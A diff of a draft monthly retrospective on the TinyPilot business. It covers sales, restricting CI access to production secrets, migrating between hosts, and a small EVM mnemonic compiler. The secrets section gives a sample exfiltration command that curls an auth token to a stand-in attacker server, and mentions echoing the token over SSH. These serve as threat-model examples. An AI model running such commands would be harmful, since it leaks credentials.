@@ -50,106 +50,227 @@ TODO
 
 March was TinyPilot's strongest month ever of sales revenue, narrowly beating [our previous record](/retrospectives/2022/12/#tinypilothttpstinypilotkvmcomrefmtlynchio-stats) by $600.
 
-Visits are down from last month but only because last month had an atypical surge in visits.
+Visits are down from last month but only because February had an atypical surge in visits.
 
 ## Tightening access to TinyPilot's production secrets
 
-Over the past few months, we've been [improving TinyPilot's release process](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process) so that it's more automated and less dependent on me specifically.
+Over the past few months, we've been [improving TinyPilot's release process](/retrospectives/2024/03/#it-turns-out-we-have-a-25-step-release-process) so that it's more automated and less dependent on me.
 
 In reviewing our release workflow, we realized that too many team members had access to production secrets. Production secrets include things like authentication tokens that allow our automated systems to publish new versions of our website or the TinyPilot application.
 
-We're a small team, so in our case, "too many" was five people instead of just one. Still, four people had access to production secrets and didn't need them, so we wanted to lock things down further.
+We're a small team, so in our case, "too many" was five people instead of just one. Still, four people had access to production secrets and didn't need them.
 
-We never store secrets in source. Instead, our secrets are in our continuous integration (CI) system, CircleCI. CI is how we test and deploy our code after it hits our source repository.
+We never store our secrets in our continuous integration (CI) system, CircleCI. CI is how we test and deploy our code after it hits our source repository.
 
 Most TinyPilot repositories are "push on green," (TODO: link) meaning that we push every code change to production after it passes our automated tests on CI.
 
-We store our secrets in CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after storing them in CircleCI.
+We store our secrets as CircleCI environment variables. This initially seemed fine because environment variables are write-only, meaning that you can't read the values after storing them in CircleCI.
 
-{{<img src="ci-env-vars.webp" has-border="true" max-width="700px" caption="CircleCI's admin interface only shows a portion of the values of environment variables, and only the CircleCI admin can see them. Note that I'm showing synthetic values, as I don't even want to expose a portion of real auth tokens.">}}
+{{<img src="ci-env-vars.webp" has-border="true" max-width="700px" caption="CircleCI's admin interface only shows a portion of the values of environment variables, and only the CircleCI admin can see them. Note that I'm showing fake values.">}}
 
 Once we started thinking more critically about protecting secrets, we realized that despite what CircleCI's web UI suggested, everyone on the team effectively had access to our environment variables. A malicious team member with access to TinyPilot source code could extract secrets in one of two ways:
 
-1. They could push a change to our CircleCI config file that exfiltrates a secret to a remote server they control like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
+1. They could push a change to our CircleCI config file in a feature branch that exfiltrates a secret to a remote server they control like `curl http://attacker-server.example.com/exfiltrate?token=$AUTH_TOKEN`
 1. They could publish an innocuous change, then SSH in to CircleCI and type `echo $AUTH_TOKEN` on the command line.
 
 (1) was semi-possible to detect, but it wasn't something we ever checked. (2) was impossible to detect, as CircleCI doesn't log SSH sessions.
 
 We looked into tightening access, and CircleCI's recommendation was to store security-sensitive secrets in "contexts." Contexts are still environment variables, but CircleCI lets you define more granular access to them.
 
-The problem was that security contexts didn't work with push on green. Security contexts only allowed you restrict access to environment variables to a certain set of people. We wanted to preserve the workflow that all changes approval from at least one teammate, but any two team members could push a change to production.
+The problem was that security contexts were incompatible with push on green. Security contexts only allowed you restrict access to environment variables to a certain set of people. We wanted to preserve the workflow that all changes required approval from at least one teammate, but any two team members could push a change to production.
 
-With CircleCI security contexts, the only way to continue our workflow would be to create a security context that everyone on the team could access, but that brought us back to our original problem.
+We could have replicated our workflow with CircleCI security contexts, but we'd need to give everyone on the team access to the secure context. We'd be no better off than we started.
 
-We reached out to CircleCI support, and they said they were coincidentally working on something that would solve our problem and would release it in a few weeks. Two weeks later, CircleCI released [expression-based context restrictions](https://circleci.com/changelog/expression-based-context-restrictions/), which did, in fact, perfectly solve our problem.
+We reached out to CircleCI support, and they said they were coincidentally planning to release something in a few weeks that would solve our problem. Two weeks later, CircleCI launched [expression-based context restrictions](https://circleci.com/changelog/expression-based-context-restrictions/), which did, in fact, perfectly solve our problem.
 
-CircleCI's expression-based restrictions allowed us to add restrictions to contexts beyond just an allowlist of users with access. They enabled us to limit access to secrets to our main branch and when SSH is disabled:
+CircleCI's expression-based restrictions allowed us to add restrictions to contexts beyond just an allowlist of users. We could restrict secrets to certain branches and disable access when SSH is enabled. We ended up with expressions like the following:
 
 ```python
 pipeline.git.branch == "master" and not job.ssh.enabled
 ```
 
-It solves (1) above because a malicious team member who tries to exfiltrate a secret using a branch would not have access to the secret in that branch.
+It solves (1) above because a malicious team member who tries to exfiltrate a secret using a branch would not have access to the secret in their branch.
 
 It solves (2) by just making the secret unavailable when a initiates a CircleCI job with SSH access.
 
-This system is still vulnerable to two team members teaming up to do something malicious. One could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly "loud" attack, as anyone else on the team could observe malicious code in a file we frequently work on, and there'd be a clear audit trail of who put it there.
+This system is still vulnerable to two team members teaming up to do something malicious. One corrupt team member could introduce a code change that exfiltrates a secret, and their co-conspirator could approve it. But this would be a particularly "loud" attack, as anyone else on the team could observe malicious code in a file we frequently work on, and there'd be a clear audit trail of who put it there.
 
 Overall, I'm happy with CircleCI's expression-based context restrictions. If you're on a team where CI has access to production secrets, I recommend you think about whether too many team members have access to secrets they don't need.
 
-## Migrating services between hosts badly and then a little better
+## Improving my process for migrating services between hosts
+
+When I started TinyPilot, I tended to host services on large providers like Google Cloud Platform and Amazon Web Services. Over the last four years, I've come to prefer smaller vendors like Netlify and Fly.io.
+
+Most of TinyPilot's services run on smaller hosting platforms, but we still had a couple that I set up at the beginning and never moved, so I decided to consolidate recently.
+
+One of the migrations was a bit bumpy, and I used the lessons to make the next one smoother.
 
 ### The Firebase to Netlify migration
 
-Moving from Firebase to Netlify
+The [TinyPilot website](https://tinypilotkvm.com) is just a static site, so we can host it anywhere. It was on Firebase hosting, as that was what I was familiar with at the time, and it's been fine. But in rearchitecting our deployment flow around security contexts, I realized it was a good opportunity to move from Firebase to my current preferred host for static sites, Netlify.
 
-One other side-benefit of Netlify is that the config file is in YAML, which allows comments. Firebase's config file was in JSON, which does not allow comments. But comments are incredibly helpful for static site configuration. For example, we maintain a set of HTTP redirects through the configuration file, and it's extremely valuable to have comments explaining why a redirect is there and whether or not it needs to exist permanently.
+It seemed like it would be a simple migration. There's no database or anything to keep in sync. I just had to start publishing the website on Netlify and update my DNS records to point to the new host.
 
-I updated the DNS entries for `tinypilotkvm.com`, and everything worked. I tried visiting the site and: TLS error. Uh oh. That's bad. Nobody wants to shop on a site that's serving a TLS error.
+Or so I thought.
 
-Had Netlify not generated the TLS certificate yet? I checked the TLS error, and it turned out that my browser was complaining about a TLS certificate from Firebase. Huh? Wouldn't Firebase still be serving the old site with the old certificate?
+I published to Netlify, updated the DNS entries for `tinypilotkvm.com`, tried visiting the site, and: TLS error. Uh oh. That's bad. Nobody wants to shop on a site that's serving a TLS error.
+
+Worse, I made this change at 9:30 AM ET on a Thursday, so it was during normal business hours where we receive most of our paying customers.
+
+Had Netlify not generated the TLS certificate yet? I checked the TLS error, and it turned out that my browser was complaining about a TLS certificate from Firebase. Huh? Wouldn't Firebase still be serving the old site with the bad certificate?
 
 My mental model of the visitors was that they'd fall in two buckets depending on how fresh the information was in their DNS server:
 
-1. They query a DNS server that has the old Firebase address -> They see the old Firebase version working as it did before I updated DNS.
-1. They query a DNS server that has the new Netlify address -> They see the new Netlify version working.
+1. They query a DNS server that has the old Firebase IP address -> They see the old Firebase version working as it did before I updated DNS.
+1. They query a DNS server that has the new Netlify IP address -> They see the new Netlify version working.
 
-Even now, I don't understand why I was seeing a Firebase certificate error.
+Even now, I don't understand why I was seeing a Firebase certificate error. The only explanation I can imagine is that Firebase reacts to DNS changes and immediately invalidates certificates when the associated DNS records change. But on the Firebase admin dashboard, it was still showing my certificates as valid.
 
-As a workaround, I configured Firebase to redirect visitors to `netlify-preview.tinypilotkvm.com`. That worked, so customers stopped seeing the TLS error. I wish I'd chosen a less weird staging domain than `netlify-preview` because it strongly suggests to customers that something is wonky, but it was better than a TLS error.
+As a workaround, I configured Firebase to redirect visitors to `netlify-preview.tinypilotkvm.com`, the staging domain I had set up for the new site the day before. That worked, so customers stopped seeing the TLS error. I wish I'd chosen a less weird staging domain than `netlify-preview` because it strongly suggests to customers that something is wonky, but it was better than a TLS error.
 
-For a full day after, the old site was still receiving traffic, but after a few days, Firebase stopped receiving any traffic for `tinypilotkvm.com`.
+For a full day after, the old Firebase site was still receiving traffic, but it slowly subsided to near zero over the course of a few days. After a week, I shut down the Firebase site.
 
 ### The AWS to Fly.io migration
 
-When it came time to
+TinyPilot uses a [LogPaste](https://github.com/mtlynch/logpaste) server to collect diagnostic logs from users. It's a basic Go app, and my preferred platform for Go services is Fly.io. But TinyPilot's LogPaste server was running on AWS LightSail, so I decided to migrate from LightSail to Fly.io.
 
-### A general strategy
+Migrating LogPaste was slightly harder than migrating the TinyPilot website, as LogPaste also has a SQLite database. But it was also lower stakes, as it wouldn't be a disaster if our LogPaste server went down for a couple of days.
 
-Move a service on example.com from platform A to platfrom B.
+The day before the migration, I dialed down the TTL on the `logs.tinypilotkvm.com` DNS entries to one minute. DNS servers don't have to respect the TTL, but I figured it was helpful that I limit caching for the ones that do.
+
+I also deployed a staging version of LogPaste to Fly.io with under domain name `logs2.tinypilotkvm.com`. That way, if I had to pull a redirect trick like I did with the TinyPilot website, I'd have a not-too-weird URL to point users to.
+
+I also prepared a migration script I could run to move data from the old LightSail version to the new Fly.io version. It was a simple bash script that [downloaded the production database](https://github.com/mtlynch/logpaste/blob/5509d61613f0bbba709ab9f093930c9696c318a8/dev-scripts/download-prod-db) from the Amazon S3 bucket and [uploaded it](https://github.com/mtlynch/logpaste/blob/master/dev-scripts/upload-prod-db) to the new Backblaze bucket backing the new Fly.io server.
+
+On deployment day, I ran the migration as soon as I woke up at 7 AM. That way, slightly fewer people would be affected if there were a temporary outage.
+
+Fortunately, the migration went smoothly. All the DNS servers in my chain seemed to respect the 1-minute TTL, as the logs for my Fly.io server showed LogPaste processing requests to `logs.tinypilotkvm.com` almost immediately.
+
+I left the LightSail up for another week, and then deleted it when I confirmed it wasn't receiving traffic anymore, and I had backed up all of its data.
+
+### A general strategy for migrating services between hosts
+
+{{<notice type="warning">}}
+**Note**: This is probably not the optimal strategy for migrating services. I suspect that there are better practices for minimizing certificate errors, but this is better than what I was doing before.
+{{</notice>}}
+
+Next time I have to move a service between hosts, I'm going to follow the process that I learned this month. As a general example, imagine that you're moving a service that you host at the URL `example.com` from platform A to platfrom B.
+
+#### Preparation day
+
+A day or two before your plan to migrate, perform these steps:
 
 1. Deploy your service to platform B.
-1. Set up a subdomain for your service pointing to platform B.
-   - Choose a subdomain that won't weird out your customers too much if they see it like `www2.example.com` or `web.example.com` not `insecure-staging.example.com`.
+1. Create a certificate for your service on platform B under a subdomain.
+   - This is usually under "add a custom domain" setting on your hosting platform.
+   - Choose a subdomain that won't weird out your customers too much if they see it like `www2.example.com` or `web.example.com`.
+   - Don't choose a subdomain that looks scary to end-users like `insecure-staging.example.com`.
+1. Add DNS entries for the new subdomain pointing to platform B.
 1. Make sure you can visit platform B through your new subdomain with no TLS errors in your browser.
 1. Reduce the TTL on root `example.com` DNS entries to something low like 1-5 minutes.
 1. Generate a certificate for `example.com` on platform B.
-   - This is usually under "add a custom domain" setting.
 
-For the real migration:
+#### Migration day
+
+On the day of the migration, perform these steps.
 
 1. Pick a time when traffic is low to your service and schedule the migration for that time.
    - If you might need support from your teammates, make sure they're available at this time.
-1. Update DNS entries to point to platform B instead of platform A.
+1. Update DNS entries for `example.com` to point to platform B instead of platform A.
+1. Check that you can still access your service through the main `example.com` URL.
 
-After a day:
+If you see TLS errors for platform A when visiting your service after the DNS changes:
 
-1. Verify that traffic to platform B has stopped.
-1. Restore your DNS entries TTL to something sensible like 60 minutes.
+- As a temporary workaround, configure platform A to redirect traffic to the staging subdomain you set up on preparation day.
+- Use `dig` to check when the DNS record expires from your local computer's perspective, and see if the TLS error goes away after the DNS entry expires.
+
+#### Decommissioning the old server
+
+At least 24 hours after the migration, perform these steps:
+
+1. Verify that traffic to platform A has stopped.
+1. Decommission your server on platform A.
+1. Verify that your service is still accessible without platform A.
+1. Restore the TTL on your DNS entries to something sensible like 60 minutes.
+1. Remove the staging subdomain from your DNS entries.
 
 ## Side projects
 
 ### Writing a simple compiler
+
+To learn more about Zig, interpreters, and Ethereum, I've been working for the past few months on a Zig implementation of the Ethereum virtual machine called [eth-zvm](https://github.com/mtlynch/eth-zvm).
+
+I'd written performance benchmarks for eth-zvm, but the programs they executed were just chunks of bytecode, like this:
+
+```text
+60016000526001601ff3
+```
+
+That worked, but it wasn't human-readable. When I wanted to modify my tests, I'd first have to decompile the bytecode to something human-readable, make my changes, then recompile everything back to raw bytes.
+
+Ethereum has a human representation of bytecode called mnemonic format, so the above bytecode would be representing in mnemonic format like this:
+
+```bash
+PUSH1 0x01
+PUSH1 0x00
+MSTORE
+PUSH1 0x01
+PUSH1 0x1f
+RETURN
+```
+
+It's still low-level, but it's easier to understand than raw bytes.
+
+I decided to make it easier on myself to write new tests, so I looked for a mnemonic to bytecode compiler. I couldn't find anything that worked out of the box on the command-line like I wanted.
+
+It seemed like an easy enough task, so I decided to write my own mnemonic to bytecode compiler.
+
+As far as compilers go, mine is about as simple as it gets. There's almost a perfect 1:1 mapping of every possible input token and every byte of output.
+
+Here's a very simple program:
+
+```bash
+$ echo 'RETURN' | ./mnc /dev/stdin /dev/stdout
+f3
+```
+
+The [opcode value for `RETURN`](https://www.evm.codes/#f3?fork=cancun) is `0xf3`, so the output bytecode is just `f3`.
+
+It gets a bit more complicated when an opcode has an argument, like `PUSH1`, which pushes a single byte onto the stack:
+
+```bash
+$ echo 'PUSH1 0x42' | ./mnc /dev/stdin /dev/stdout
+6042
+```
+
+And we can also use `PUSH32`, which pushes a 32-byte value onto the stack:
+
+```bash
+$ echo 'PUSH32 0x42' | ./mnc /dev/stdin /dev/stdout
+7f0000000000000000000000000000000000000000000000000000000000000042
+```
+
+I also made it so that I can comment my mnemonic code, and the compiler ignores those lines. Here's my example application from above, but with comments:
+
+```bash
+$ tempfile="$(mktemp)" && \
+  cat << EOF > "${tempfile}"
+// Store 0x01 in memory.
+PUSH1 0x01
+PUSH1 0x00
+MSTORE
+
+// Return 1 byte from offset 31 in memory.
+PUSH1 0x01
+PUSH1 0x1f
+RETURN
+EOF
+
+$ ./mnc "${tempfile}" /dev/stdout
+60016000526001601ff3
+```
+
+So, now eth-zvm's benchmark examples are in source code in human-readable mnemonic format, and I [compile them to bytecode on-demand](https://github.com/mtlynch/eth-zvm/blob/b21747c6873cc2187c83298032e2869d45da5274/.circleci/config.yml#L22-L41) to run the benchmarks.
 
 It accepts code that's semantically incorrect like `PUSH1 RETURN`, but it's good enough for my purposes.
 
